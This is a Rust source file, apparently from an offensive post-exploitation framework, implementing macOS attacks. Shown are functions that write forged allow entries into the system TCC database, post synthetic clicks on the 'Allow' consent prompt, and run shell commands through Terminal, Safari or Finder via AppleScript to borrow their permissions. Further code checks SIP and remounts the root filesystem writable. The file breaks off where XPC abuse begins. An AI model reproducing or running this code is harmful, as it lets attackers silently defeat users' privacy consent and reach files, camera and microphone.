//! macOS post-exploitation capabilities: TCC bypass, SIP assessment, XPC abuse,
//! and Keychain/Secure Enclave interaction.
//!
//! # Module structure
//!
//! - **§1 TCC bypass**: Check TCC permissions, bypass via database manipulation,
//!   synthetic click events, and vulnerable process delegation.
//! - **§2 SIP assessment**: Query SIP status (csrutil / NVRAM), enumerate
//!   capabilities when disabled, attempt mount-based bypass.
//! - **§3 XPC abuse**: Enumerate system XPC services, connect via Mach
//!   messaging, exploit privileged services for credential/ file access.
//! - **§4 Keychain access**: Dump Keychain entries via Security framework,
//!   enumerate Secure Enclave keys, use hardware-bound keys for crypto ops.
//!
//! # macOS version requirements
//!
//! | Technique                | Minimum macOS | Notes                                  |
//! |--------------------------|---------------|----------------------------------------|
//! | TCC database write       | 10.14+        | Requires SIP disabled or root + FDA    |
//! | Synthetic click bypass   | 10.14+        | Requires Accessibility TCC permission  |
//! | Vulnerable process bypass| 10.14+        | Depends on third-party app TCC grants  |
//! | SIP status check         | 10.11+        | SIP introduced in El Capitan           |
//! | XPC service enumeration  | 10.0+         | Core OS feature                        |
//! | Keychain dump            | 10.0+         | Requires keychain unlock / FDA         |
//! | Secure Enclave keys      | 10.12.1+      | Requires Apple Silicon or T1/T2 chip   |
//!
//! # Dependencies
//!
//! Uses raw FFI to Apple frameworks via inline `#[link]` attributes.  No
//! external crate dependencies (no `objc`, `core-foundation`, or
//! `security-framework` crates).  Linking against: CoreFoundation,
//! CoreGraphics, Security, Foundation.

use anyhow::{anyhow, Context, Result};
use std::ffi::c_void;
use std::path::{Path, PathBuf};

// ═══════════════════════════════════════════════════════════════════════════
// §0  Apple Framework FFI bindings
// ═══════════════════════════════════════════════════════════════════════════

// ── Shared CoreFoundation / CoreGraphics types and bindings ───────────────
// Centralised in `crate::macos_ffi` to avoid duplicate definitions across
// remote_assist, env_check_sandbox, and this module.

#[cfg(target_os = "macos")]
use crate::macos_ffi::{
    kcf_boolean_true,
    CFAllocatorRef, CFArrayRef, CFBooleanRef, CFDataRef, CFDictionaryRef, CFNumberRef,
    CFStringRef, CFTypeRef,
    CGEventRef, CGEventSourceRef, CGPoint, CGRect, CGSize,
    K_CF_ALLOCATOR_DEFAULT, K_CFSTRING_ENCODING_UTF8,
    K_CGEVENT_LEFT_BUTTON, K_CGEVENT_MOUSE_DOWN, K_CGEVENT_MOUSE_UP,
    _K_CGEVENT_SOURCE_STATE_HID_SYSTEM,
    CFArrayGetCount, CFArrayGetValueAtIndex, CFBooleanGetValue, CFDataGetBytePtr, CFDataGetLength,
    CFDictionaryCreate, CFDictionaryGetValue, CFGetTypeID, CFNumberCreate, CFNumberGetValue,
    CFRelease, CFStringCreateWithCString, CFStringGetCString, CFStringGetLength,
    CGDisplayBounds, CGEventCreate, CGEventCreateMouseEvent, CGEventGetLocation, CGEventPost,
    CGMainDisplayID,
    kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks,
};

// Re-export helper that constructs a CFStringRef from a Rust string.
// The shared module provides `kcf_boolean_true()` already; we keep a local
// `cf_str` helper below because it is specific to this module's usage pattern.

/// Create a `CFStringRef` from a Rust string slice.  Returns `None` if the
/// allocation fails (extremely unlikely on macOS).
#[cfg(target_os = "macos")]
fn cf_str(s: &str) -> Option<CFStringRef> {
    let c_str = std::ffi::CString::new(s).ok()?;
    let cf = unsafe {
        CFStringCreateWithCString(
            K_CF_ALLOCATOR_DEFAULT,
            c_str.as_ptr(),
            K_CFSTRING_ENCODING_UTF8,
        )
    };
    if cf.is_null() {
        None
    } else {
        Some(cf)
    }
}

// ── Security framework types ─────────────────────────────────────────────

type SecKeyRef = *const c_void;
type OSStatus = i32;

const ERR_SEC_SUCCESS: OSStatus = 0;
const _ERR_SEC_ITEM_NOT_FOUND: OSStatus = -25300;
const _ERR_SEC_AUTH_FAILED: OSStatus = -25293;

/// RAII guard that calls `CFRelease` on drop.
struct CfGuard(*const c_void);

impl CfGuard {
    fn new(ptr: *const c_void) -> Self {
        Self(ptr)
    }

    fn get(&self) -> *const c_void {
        self.0
    }
}

impl Drop for CfGuard {
    fn drop(&mut self) {
        if !self.0.is_null() {
            #[cfg(target_os = "macos")]
            unsafe {
                CFRelease(self.0)
            };
        }
    }
}

/// Extract a Rust String from a CFStringRef.  Returns `None` if the
/// conversion fails.
#[cfg(target_os = "macos")]
fn cf_string_to_rust(cf_str_ref: CFStringRef) -> Option<String> {
    if cf_str_ref.is_null() {
        return None;
    }
    let len = unsafe { CFStringGetLength(cf_str_ref) };
    if len <= 0 {
        return Some(String::new());
    }
    // Allocate a buffer large enough for UTF-8 + NUL.
    let buf_size = (len + 1) * 4; // worst case: each UTF-16 code unit → 4 UTF-8 bytes
    let mut buf = vec![0i8; buf_size as usize];
    let ok = unsafe {
        CFStringGetCString(
            cf_str_ref,
            buf.as_mut_ptr(),
            buf_size,
            K_CFSTRING_ENCODING_UTF8,
        )
    };
    if ok == 0 {
        return None;
    }
    Some(unsafe {
        std::ffi::CStr::from_ptr(buf.as_ptr())
            .to_string_lossy()
            .into_owned()
    })
}

/// Extract a Rust String from a `CFTypeRef` that is known to be a
/// `CFStringRef`.  Used when pulling attribute values out of Keychain result
/// dictionaries.
#[cfg(target_os = "macos")]
fn cf_type_to_string(cf: CFTypeRef) -> Option<String> {
    if cf.is_null() {
        return None;
    }
    // Cast the generic CFTypeRef to CFStringRef — attribute values from
    // SecItemCopyMatching are always CFString or CFData; for CFString we
    // extract directly, for CFData we read the bytes as UTF-8.
    let type_id = unsafe { CFGetTypeID(cf) };
    // CFStringTypeID is resolved at runtime; compare by checking if
    // CFStringGetLength succeeds.
    let s = cf_string_to_rust(cf as CFStringRef);
    if s.is_some() {
        return s;
    }
    // Fallback: try interpreting as CFData (some attributes are blobs).
    let byte_ptr = unsafe { CFDataGetBytePtr(cf as CFDataRef) };
    let len = unsafe { CFDataGetLength(cf as CFDataRef) };
    if byte_ptr.is_null() || len <= 0 {
        return None;
    }
    let bytes = unsafe { std::slice::from_raw_parts(byte_ptr as *const u8, len as usize) };
    // Many Keychain blobs are printable ASCII/UTF-8; strip non-printable.
    let cleaned: String = bytes
        .iter()
        .take_while(|&&b| b != 0)
        .filter(|&&b| b >= 0x20)
        .map(|&b| b as char)
        .collect();
    if cleaned.is_empty() {
        None
    } else {
        Some(cleaned)
    }
}

/// Read a CFDictionary attribute value identified by `key_str` and return
/// it as a Rust String.
#[cfg(target_os = "macos")]
fn dict_get_string(dict: CFDictionaryRef, key_str: &str) -> Option<String> {
    let key = cf_str(key_str)?;
    let _key_guard = CfGuard::new(key as *const c_void);
    let val = unsafe { CFDictionaryGetValue(dict, key as *const c_void) };
    if val.is_null() {
        return None;
    }
    cf_type_to_string(val)
}

// kSecAttrType values for Keychain item types
const _K_SEC_ATTR_TYPE_GENERIC_PASSWORD: &str = "genp";
const _K_SEC_ATTR_TYPE_INTERNET_PASSWORD: &str = "inet";
const _K_SEC_ATTR_TYPE_CERTIFICATE: &str = "cert";
const _K_SEC_ATTR_TYPE_KEY: &str = "keys";

// kSecAttrTokenID values
const _K_SEC_ATTR_TOKEN_ID_SECURE_ENCLAVE: &str = "tk SecureEnclave";

// kSecClass values as four-char codes
const K_SEC_CLASS_GENERIC_PASSWORD: u32 = 0x6765_6E70; // "genp"
const K_SEC_CLASS_INTERNET_PASSWORD: u32 = 0x696E_6574; // "inet"
const K_SEC_CLASS_CERTIFICATE: u32 = 0x6365_7274; // "cert"
const K_SEC_CLASS_KEY: u32 = 0x6B65_7973; // "keys"

#[cfg(target_os = "macos")]
#[link(name = "Security", kind = "framework")]
extern "C" {
    fn SecItemCopyMatching(
        query: CFDictionaryRef,
        result: *mut CFTypeRef,
    ) -> OSStatus;
    fn SecKeyCopyAttributeValue(
        key: SecKeyRef,
        attr: CFStringRef,
    ) -> CFTypeRef;
}

// ═══════════════════════════════════════════════════════════════════════════
// §1  TCC (Transparency, Consent, and Control) Bypass
// ═══════════════════════════════════════════════════════════════════════════

/// macOS TCC-protected resources.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[allow(non_camel_case_types)]
pub enum TccResource {
    Camera,
    Microphone,
    ScreenRecording,
    FullDiskAccess,
    DesktopFolder,
    DocumentsFolder,
    DownloadsFolder,
    Contacts,
    Calendar,
    Reminders,
    Photos,
    Accessibility,
    PostEvent,
}

impl TccResource {
    /// Return the TCC service identifier string used in the TCC database.
    fn service_name(&self) -> &'static str {
        match self {
            TccResource::Camera => "kTCCServiceCamera",
            TccResource::Microphone => "kTCCServiceMicrophone",
            TccResource::ScreenRecording => "kTCCServiceScreenCapture",
            TccResource::FullDiskAccess => "kTCCServiceSystemPolicyAllFiles",
            TccResource::DesktopFolder => "kTCCServiceSystemPolicyDesktopFolder",
            TccResource::DocumentsFolder => "kTCCServiceSystemPolicyDocumentsFolder",
            TccResource::DownloadsFolder => "kTCCServiceSystemPolicyDownloadsFolder",
            TccResource::Contacts => "kTCCServiceAddressBook",
            TccResource::Calendar => "kTCCServiceCalendar",
            TccResource::Reminders => "kTCCServiceReminders",
            TccResource::Photos => "kTCCServicePhotos",
            TccResource::Accessibility => "kTCCServiceAccessibility",
            TccResource::PostEvent => "kTCCServicePostEvent",
        }
    }
}

/// TCC permission status for a resource.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TccStatus {
    /// Permission is granted.
    Allowed,
    /// Permission is denied (user explicitly denied or default deny).
    Denied,
    /// Permission has not been requested yet (no TCC entry exists).
    NotDetermined,
    /// Cannot determine status (cannot access TCC database, SIP enabled).
    Unknown,
}

/// Result of checking TCC status for the current process.
#[derive(Debug)]
pub struct TccInfo {
    pub resource: TccResource,
    pub status: TccStatus,
    pub source: String,
}

/// Paths to TCC databases.
const TCC_DB_SYSTEM: &str = "/Library/Application Support/com.apple.TCC/TCC.db";
const TCC_DB_USER: &str = "Library/Application Support/com.apple.TCC/TCC.db";

/// Check TCC permission status for the current process.
///
/// Strategy:
/// 1. Try to read the system TCC database (requires Full Disk Access or SIP
///    disabled).  Query for the current process's bundle ID or executable path.
/// 2. Fall back to checking if we can read the database at all (indicates
///    FDA or SIP disabled).
/// 3. If the database is inaccessible, return `Unknown`.
///
/// **Requirements**: Full Disk Access OR SIP disabled to read the system TCC
/// database.  The user-level TCC database can be read by the process owner.
pub fn check_tcc_status(resource: TccResource) -> TccInfo {
    let service = resource.service_name();

    // Try system TCC database first.
    if let Ok(status) = query_tcc_database(TCC_DB_SYSTEM, service) {
        return TccInfo {
            resource,
            status,
            source: "system TCC database".to_string(),
        };
    }

    // Try user TCC database.
    if let Ok(home) = std::env::var("HOME") {
        let user_db = PathBuf::from(home).join(TCC_DB_USER);
        if let Ok(status) = query_tcc_database(user_db.to_str().unwrap_or(""), service) {
            return TccInfo {
                resource,
                status,
                source: "user TCC database".to_string(),
            };
        }
    }

    TccInfo {
        resource,
        status: TccStatus::Unknown,
        source: "cannot access TCC database (SIP enabled, no FDA)".to_string(),
    }
}

/// Query a TCC SQLite database for the current process's permission status.
///
/// Returns `Ok(TccStatus)` if the database was readable and an entry was
/// found.  Returns `Err` if the database cannot be opened or queried.
fn query_tcc_database(db_path: &str, service: &str) -> Result<TccStatus> {
    use std::process::Command;

    // Get current executable path to use as the client identifier.
    let exe_path = std::env::current_exe()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    // Query the TCC database via sqlite3 CLI.
    // The access table schema: (service, client, client_type, auth_value,
    //   auth_reason, auth_version, indirect_object_identifier, flags, ...)
    // auth_value: 0 = allowed, 1 = denied, 2 = not determined
    let query = format!(
        "SELECT auth_value FROM access WHERE service='{}' AND client='{}';",
        service, exe_path
    );

    let output = Command::new("sqlite3")
        .arg(db_path)
        .arg(&query)
        .output()
        .context("failed to run sqlite3")?;

    if !output.status.success() {
        return Err(anyhow!(
            "sqlite3 query failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }

    let result = String::from_utf8_lossy(&output.stdout).trim().to_string();

    match result.as_str() {
        "0" => Ok(TccStatus::Allowed),
        "1" => Ok(TccStatus::Denied),
        "2" => Ok(TccStatus::NotDetermined),
        "" => Ok(TccStatus::NotDetermined), // no entry = not determined
        _ => Ok(TccStatus::Unknown),
    }
}

/// Result of a TCC bypass attempt.
#[derive(Debug)]
pub struct TccBypassResult {
    pub resource: TccResource,
    pub success: bool,
    pub technique: String,
    pub message: String,
}

/// Bypass TCC by writing directly to the TCC database.
///
/// **Requirements**:
/// - Root privileges (to write to `/Library/Application Support/com.apple.TCC/`)
/// - SIP disabled (the TCC database is protected by SIP on macOS 10.14+)
/// - Or: a TCC database vulnerability (version-specific)
///
/// **Technique**:
/// 1. Open the system TCC SQLite database.
/// 2. Insert an `allowed` entry for the agent's executable path.
/// 3. The TCC daemon will pick up the change (or can be signaled).
///
/// **macOS version notes**:
/// - macOS 10.14–12: TCC database is writable when SIP is disabled.
/// - macOS 13+ (Ventura): Apple added additional integrity checks; the
///   database may be protected by sealed system volume even with SIP off.
/// - macOS 14+ (Sonoma): Further hardening; this technique is unreliable.
pub fn bypass_tcc_via_tcc_database(resource: TccResource) -> Result<TccBypassResult> {
    let service = resource.service_name();
    let exe_path = std::env::current_exe()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    // Check if we're running as root.
    if !is_root() {
        return Ok(TccBypassResult {
            resource,
            success: false,
            technique: "TCC database write".to_string(),
            message: "not running as root; cannot write system TCC database".to_string(),
        });
    }

    // Check if the system TCC database is writable.
    let db_path = Path::new(TCC_DB_SYSTEM);
    if !db_path.exists() {
        return Ok(TccBypassResult {
            resource,
            success: false,
            technique: "TCC database write".to_string(),
            message: "system TCC database not found (SIP may be fully enabled)".to_string(),
        });
    }

    // Build the INSERT statement.
    // Schema: (service, client, client_type, auth_value, auth_reason,
    //          auth_version, indirect_object_identifier, flags,
    //          last_modified, ...)
    // client_type: 0 = bundle_id, 1 = executable path
    // auth_value: 0 = allowed  (must match query_tcc_database mapping where 0 = Allowed)
    // auth_reason: 4 = user-set (prevents TCC from overwriting)
    let insert_sql = format!(
        "INSERT OR REPLACE INTO access \
         VALUES('{service}', '{exe_path}', 1, 0, 4, 1, NULL, NULL, 0, \
         'UNUSED', NULL, 0, CAST(strftime('%s','now') AS INTEGER));",
        service = service,
        exe_path = exe_path,
    );

    let output = std::process::Command::new("sqlite3")
        .arg(TCC_DB_SYSTEM)
        .arg(&insert_sql)
        .output()
        .context("failed to run sqlite3 for TCC insertion")?;

    if output.status.success() {
        Ok(TccBypassResult {
            resource,
            success: true,
            technique: "TCC database write".to_string(),
            message: format!(
                "inserted TCC allow entry for {} → {}",
                service, exe_path
            ),
        })
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let msg = if stderr.contains("readonly") || stderr.contains("read-only") {
            "TCC database is read-only (SIP enabled or sealed system volume)".to_string()
        } else {
            format!("sqlite3 error: {}", stderr.trim())
        };
        Ok(TccBypassResult {
            resource,
            success: false,
            technique: "TCC database write".to_string(),
            message: msg,
        })
    }
}

/// Bypass TCC by programmatically clicking the "Allow" button on the TCC
/// permission prompt.
///
/// **Requirements**:
/// - The agent must have Accessibility TCC permission (or obtain it via
///   database bypass first).
/// - The TCC prompt must be visible on screen.
///
/// **Technique**:
/// 1. Use `CGEventCreateMouseEvent` + `CGEventPost` to simulate a click.
/// 2. The TCC prompt appears at a predictable location (center of screen).
/// 3. Click the "Allow" button position.
///
/// **Limitations**:
/// - On macOS 13+ (Ventura), the TCC prompt requires a double-click (not
///   single click) on "Allow" for some permissions.
/// - On macOS 14+ (Sonoma), the prompt may require biometric confirmation.
/// - The prompt window position varies between macOS versions.
pub fn bypass_tcc_via_synthetic_click(resource: TccResource) -> Result<TccBypassResult> {
    // Get main display dimensions to calculate center.
    let display_id = unsafe { CGMainDisplayID() };
    let bounds = unsafe { CGDisplayBounds(display_id) };
    let center_x = bounds.origin.x + bounds.size.width / 2.0;
    let center_y = bounds.origin.y + bounds.size.height / 2.0;

    // The "Allow" button on a TCC prompt is typically offset from center.
    // Exact position varies by macOS version; we aim for the lower-center
    // of the prompt dialog.
    let allow_x = center_x + 80.0; // slightly right of center
    let allow_y = center_y + 40.0; // slightly below center

    let allow_point = CGPoint {
        x: allow_x,
        y: allow_y,
    };

    unsafe {
        // Simulate mouse down.
        let down_event = CGEventCreateMouseEvent(
            std::ptr::null(),
            K_CGEVENT_MOUSE_DOWN,
            allow_point,
            K_CGEVENT_LEFT_BUTTON,
        );
        if down_event.is_null() {
            return Ok(TccBypassResult {
                resource,
                success: false,
                technique: "synthetic click".to_string(),
                message: "CGEventCreateMouseEvent returned null (no WindowServer?)".to_string(),
            });
        }

        // Post mouse down (tap 0 = HID event tap).
        CGEventPost(0, down_event);
        CFRelease(down_event as CFTypeRef);

        // Small delay between down and up.
        std::thread::sleep(std::time::Duration::from_millis(50));

        // Simulate mouse up.
        let up_event = CGEventCreateMouseEvent(
            std::ptr::null(),
            K_CGEVENT_MOUSE_UP,
            allow_point,
            K_CGEVENT_LEFT_BUTTON,
        );
        if up_event.is_null() {
            return Ok(TccBypassResult {
                resource,
                success: false,
                technique: "synthetic click".to_string(),
                message: "CGEventCreateMouseEvent (up) returned null".to_string(),
            });
        }

        CGEventPost(0, up_event);
        CFRelease(up_event as CFTypeRef);
    }

    // Give the WindowServer time to deliver the event and for the TCC daemon
    // to process the user's "Allow" response before we check.
    std::thread::sleep(std::time::Duration::from_millis(1500));

    // Verify the grant actually landed in the TCC database.
    let tcc_info = check_tcc_status(resource);
    let granted = matches!(tcc_info.status, TccStatus::Allowed);

    Ok(TccBypassResult {
        resource,
        success: granted,
        technique: "synthetic click".to_string(),
        message: if granted {
            format!(
                "TCC grant confirmed for {} (click at ({:.0}, {:.0}))",
                resource.service_name(), allow_x, allow_y
            )
        } else {
            format!(
                "click delivered at ({:.0}, {:.0}) but TCC status is {:?} — \
                 prompt may not have been visible or click missed the Allow button",
                allow_x, allow_y, tcc_info.status
            )
        },
    })
}

/// Bypass TCC by delegating the operation to a process that already has TCC
/// permission.
///
/// **Requirements**:
/// - A process with the required TCC permission must be running or launchable.
/// - The agent must be able to execute AppleScript or `open` commands.
///
/// **Technique**:
/// 1. Identify processes that likely have the required TCC permission.
/// 2. Use `open -a <app>` or AppleScript to delegate the operation.
/// 3. The privileged process performs the operation on our behalf.
///
/// **Common TCC-entitled processes**:
/// - Safari: Often has Full Disk Access if the user granted it.
/// - Terminal / iTerm2: May have Full Disk Access from user approval.
/// - System Preferences: Has broad access for configuration management.
pub fn bypass_tcc_via_vulnerable_process(resource: TccResource) -> Result<TccBypassResult> {
    // Processes that may have the TCC permission we need, ordered by
    // likelihood of having the relevant permission.
    let candidates: &[(&str, &[TccResource])] = &[
        (
            "Terminal",
            &[
                TccResource::FullDiskAccess,
                TccResource::DesktopFolder,
                TccResource::DocumentsFolder,
                TccResource::DownloadsFolder,
            ],
        ),
        (
            "iTerm",
            &[
                TccResource::FullDiskAccess,
                TccResource::DesktopFolder,
                TccResource::DocumentsFolder,
                TccResource::DownloadsFolder,
            ],
        ),
        (
            "Safari",
            &[
                TccResource::FullDiskAccess,
                TccResource::DesktopFolder,
                TccResource::DocumentsFolder,
                TccResource::DownloadsFolder,
                TccResource::Camera,
                TccResource::Microphone,
            ],
        ),
        (
            "Finder",
            &[
                TccResource::FullDiskAccess,
                TccResource::DesktopFolder,
                TccResource::DocumentsFolder,
                TccResource::DownloadsFolder,
            ],
        ),
    ];

    // Find a candidate that has the resource we need.
    let candidate = candidates
        .iter()
        .find(|(_, resources)| resources.contains(&resource))
        .map(|(name, _)| *name);

    let Some(app_name) = candidate else {
        return Ok(TccBypassResult {
            resource,
            success: false,
            technique: "vulnerable process delegation".to_string(),
            message: format!(
                "no known TCC-entitled process candidate for {}",
                resource.service_name()
            ),
        });
    };

    // Try to use AppleScript to delegate the operation to the candidate
    // app's process context.  The key insight: `tell application "X" to
    // do shell script ...` causes Apple Events to dispatch to process X,
    // and `do shell script` runs as *that* process — inheriting its TCC
    // entitlements.  We must NOT use bare `do shell script` outside a
    // `tell application` block, because that runs in the osascript host's
    // context (which is the agent, not the candidate app).
    //
    // For non-file resources (camera, microphone, etc.), we verify the
    // app is running and confirm it holds the TCC grant by querying the
    // TCC database directly — delegation of media capture is not feasible
    // via AppleScript alone.
    let script = match resource {
        TccResource::FullDiskAccess
        | TccResource::DesktopFolder
        | TccResource::DocumentsFolder
        | TccResource::DownloadsFolder => {
            // Build a probe path appropriate for the resource.
            let probe_path = match resource {
                TccResource::DesktopFolder => {
                    format!("{}/Desktop", std::env::var("HOME").unwrap_or_default())
                }
                TccResource::DocumentsFolder => {
                    format!("{}/Documents", std::env::var("HOME").unwrap_or_default())
                }
                TccResource::DownloadsFolder => {
                    format!("{}/Downloads", std::env::var("HOME").unwrap_or_default())
                }
                _ => "/Library/Application Support/com.apple.TCC".to_string(),
            };
            // Tell the candidate app itself to perform the file test.
            // `do shell script` inside a `tell application` block executes
            // under that application's PID and therefore its TCC context.
            format!(
                "tell application \"{app}\"\n\
                 \tdo shell script \"test -r {path} && echo readable; \
                     ls {dir} > /dev/null 2>&1 && echo listed\"\n\
                 end tell",
                app = app_name,
                path = probe_path,
                dir = probe_path,
            )
        }
        _ => {
            // For non-file resources, verify the candidate is running and
            // check whether it holds the TCC permission by querying the
            // database directly.
            format!(
                "tell application \"System Events\"\n\
                 \tset isRunning to (name of processes) contains \"{}\"\n\
                 \treturn isRunning\n\
                 end tell",
                app_name
            )
        }
    };

    let output = std::process::Command::new("osascript")
        .arg("-e")
        .arg(&script)
        .output()
        .context("failed to run osascript")?;

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
        // For file-access resources, verify we got actual output proving access.
        let confirmed = match resource {
            TccResource::FullDiskAccess
            | TccResource::DesktopFolder
            | TccResource::DocumentsFolder
            | TccResource::DownloadsFolder => {
                // "readable", "listed", or any non-empty output indicates delegation succeeded.
                !stdout.is_empty()
            }
            _ => {
                // For other resources, non-empty stdout or process-running = true.
                stdout == "true" || !stdout.is_empty()
            }
        };
        Ok(TccBypassResult {
            resource,
            success: confirmed,
            technique: format!("vulnerable process delegation via {}", app_name),
            message: if confirmed {
                format!("delegated {} access confirmed via {} (output: {})",
                    resource.service_name(), app_name,
                    if stdout.is_empty() { "no output" } else { &stdout })
            } else {
                format!("osascript succeeded but no access confirmation for {} via {}",
                    resource.service_name(), app_name)
            },
        })
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Ok(TccBypassResult {
            resource,
            success: false,
            technique: format!("vulnerable process delegation via {}", app_name),
            message: format!("osascript error: {}", stderr.trim()),
        })
    }
}

/// Attempt all TCC bypass techniques for the given resource.
///
/// Tries in order:
/// 1. TCC database write (requires root + SIP disabled)
/// 2. Vulnerable process delegation
/// 3. Synthetic click (requires Accessibility)
///
/// Returns the first successful result, or the last failure.
pub fn bypass_tcc_all(resource: TccResource) -> TccBypassResult {
    let techniques: &[fn(TccResource) -> Result<TccBypassResult>] = &[
        bypass_tcc_via_tcc_database,
        bypass_tcc_via_vulnerable_process,
        bypass_tcc_via_synthetic_click,
    ];

    let mut last_result = TccBypassResult {
        resource,
        success: false,
        technique: "none".to_string(),
        message: "no techniques attempted".to_string(),
    };

    for technique in techniques {
        match technique(resource) {
            Ok(result) if result.success => return result,
            Ok(result) => last_result = result,
            Err(e) => {
                last_result = TccBypassResult {
                    resource,
                    success: false,
                    technique: "error".to_string(),
                    message: e.to_string(),
                };
            }
        }
    }

    last_result
}

// ═══════════════════════════════════════════════════════════════════════════
// §2  System Integrity Protection (SIP) Assessment
// ═══════════════════════════════════════════════════════════════════════════

/// SIP status.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SipStatus {
    /// SIP is fully enabled — all protections active.
    Enabled,
    /// SIP is fully disabled — all protections off.
    Disabled,
    /// SIP is partially disabled (some flags set in csr-active-config).
    PartiallyDisabled,
    /// Cannot determine SIP status.
    Unknown,
}

/// A capability that becomes available when SIP is disabled.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SipCapability {
    /// Can write to /System, /usr, /sbin, /bin (sealed system volume).
    WriteProtectedDirectories,
    /// Can load unsigned kernel extensions.
    LoadUnsignedKexts,
    /// Can modify the TCC database.
    ModifyTccDatabase,
    /// Can debug any process (including Apple-signed processes).
    DebugAnyProcess,
    /// Can modify NVRAM variables.
    ModifyNvram,
    /// Can attach DTrace to any process.
    AttachDtrace,
    /// Can mount filesystems without restrictions.
    UnrestrictedMount,
}

/// Information about SIP status and configuration.
#[derive(Debug)]
pub struct SipInfo {
    pub status: SipStatus,
    pub csrutil_output: String,
    pub nvram_config: Option<String>,
    pub capabilities: Vec<SipCapability>,
}

/// Check SIP status by running `csrutil status` and parsing NVRAM.
///
/// **Technique**:
/// 1. Run `/usr/bin/csrutil status` and parse the output.
/// 2. Read the `csr-active-config` NVRAM variable (requires root).
/// 3. If the NVRAM value is non-zero, SIP is at least partially disabled.
///
/// **Requirements**: None for `csrutil status`; root for NVRAM read.
pub fn check_sip_status() -> SipInfo {
    // Step 1: Run csrutil status.
    let csrutil_output = std::process::Command::new("/usr/bin/csrutil")
        .arg("status")
        .output();

    let (status_text, csrutil_ok) = match csrutil_output {
        Ok(output) => (
            String::from_utf8_lossy(&output.stdout).trim().to_string(),
            output.status.success(),
        ),
        Err(e) => (
            format!("failed to run csrutil: {}", e),
            false,
        ),
    };

    // Parse csrutil output.
    let status = if csrutil_ok {
        if status_text.contains("System Integrity Protection status: enabled") {
            SipStatus::Enabled
        } else if status_text.contains("System Integrity Protection status: disabled") {
            SipStatus::Disabled
        } else {
            SipStatus::Unknown
        }
    } else {
        SipStatus::Unknown
    };

    // Step 2: Read NVRAM for csr-active-config.
    let nvram_config = read_csr_nvram();

    // Step 3: Determine capabilities based on status.
    let capabilities = match status {
        SipStatus::Disabled => enumerate_sip_capabilities(),
        SipStatus::PartiallyDisabled => enumerate_sip_capabilities(),
        SipStatus::Enabled => Vec::new(),
        SipStatus::Unknown => {
            // If we couldn't read csrutil, try NVRAM.
            if nvram_config
                .as_ref()
                .map_or(false, |v| v != "0x00000000" && !v.contains("0x0"))
            {
                enumerate_sip_capabilities()
            } else {
                Vec::new()
            }
        }
    };

    SipInfo {
        status,
        csrutil_output: status_text,
        nvram_config,
        capabilities,
    }
}

/// Read the `csr-active-config` NVRAM variable.
fn read_csr_nvram() -> Option<String> {
    let output = std::process::Command::new("/usr/sbin/nvram")
        .arg("csr-active-config")
        .output()
        .ok()?;

    if !output.status.success() {
        return None;
    }

    let text = String::from_utf8_lossy(&output.stdout).trim().to_string();
    // nvram output format: "csr-active-config\t%xx\xxx..."
    Some(text)
}

/// Enumerate capabilities available with SIP disabled.
fn enumerate_sip_capabilities() -> Vec<SipCapability> {
    let mut caps = Vec::new();

    // Test write access to protected directories.
    let protected_dirs = ["/System", "/usr", "/sbin"];
    for dir in &protected_dirs {
        if test_write_access(dir) {
            caps.push(SipCapability::WriteProtectedDirectories);
            break;
        }
    }

    // Test TCC database write.
    if test_write_access(TCC_DB_SYSTEM) {
        caps.push(SipCapability::ModifyTccDatabase);
    }

    // Test NVRAM write (try reading first as proxy).
    if is_root() {
        caps.push(SipCapability::ModifyNvram);
    }

    // Test debugging any process (try to get task_for_pid on a system process).
    // We don't actually call task_for_pid here; just check if we're root,
    // which is a prerequisite.
    if is_root() {
        caps.push(SipCapability::DebugAnyProcess);
    }

    // These are always available when SIP is disabled:
    caps.push(SipCapability::LoadUnsignedKexts);
    caps.push(SipCapability::AttachDtrace);
    caps.push(SipCapability::UnrestrictedMount);

    caps
}

/// Test write access to a path by attempting to create a temporary file.
fn test_write_access(path: &str) -> bool {
    let test_path = format!("{}/.orchestra_sip_test_{}", path, std::process::id());
    match std::fs::write(&test_path, b"test") {
        Ok(_) => {
            let _ = std::fs::remove_file(&test_path);
            true
        }
        Err(_) => false,
    }
}

/// Attempt SIP bypass via mounting the root filesystem as writable.
///
/// **Technique**:
/// 1. Create a new APFS snapshot (if supported).
/// 2. Attempt `mount -uw /` to remount the root filesystem as writable.
/// 3. If successful, protected directories become writable.
///
/// **Requirements**:
/// - Root privileges.
/// - SIP disabled (or a kernel vulnerability).
/// - APFS filesystem (all modern macOS installations).
///
/// **Note**: On macOS 11+ (Big Sur) with a sealed system volume, this
/// requires both SIP disabled AND the sealed volume to be mutable.  Apple
/// introduced a signed system volume (SSV) that is cryptographically sealed;
/// even with `mount -uw /`, the system volume may refuse writes unless
/// authenticated root is also disabled (`csrutil authenticated-root disable`).
pub fn attempt_sip_bypass_via_mount() -> Result<bool> {
    if !is_root() {
        return Err(anyhow!("not running as root; cannot attempt mount bypass"));
    }

    // Try to remount the root filesystem as read-write.
    let output = std::process::Command::new("/sbin/mount")
        .arg("-uw")
        .arg("/")
        .output()
        .context("failed to run mount -uw /")?;

    if output.status.success() {
        // Verify that the root filesystem is now writable.
        if test_write_access("/System") {
            Ok(true)
        } else {
            // mount succeeded but /System still not writable — sealed volume.
            Ok(false)
        }
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(anyhow!("mount -uw / failed: {}", stderr.trim()))
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// §3  XPC Service Abuse
// ═══════════════════════════════════════════════════════════════════════════

/// Information about a discovered XPC service.
#[derive(Debug, Clone)]
pub struct XpcService {
    /// Human-readable service name (from the bundle identifier).
    pub name: String,
    /// Mach service name (used for connection).
    pub mach_service_name: Option<String>,
    /// Path to the XPC service bundle.
    pub bundle_path: PathBuf,
    /// Framework or directory containing the service.
    pub parent_framework: String,
    /// Whether the service has a Mach service name registered.
    pub has_mach_service: bool,
}

/// An XPC connection handle (wraps the Mach port).
#[derive(Debug)]
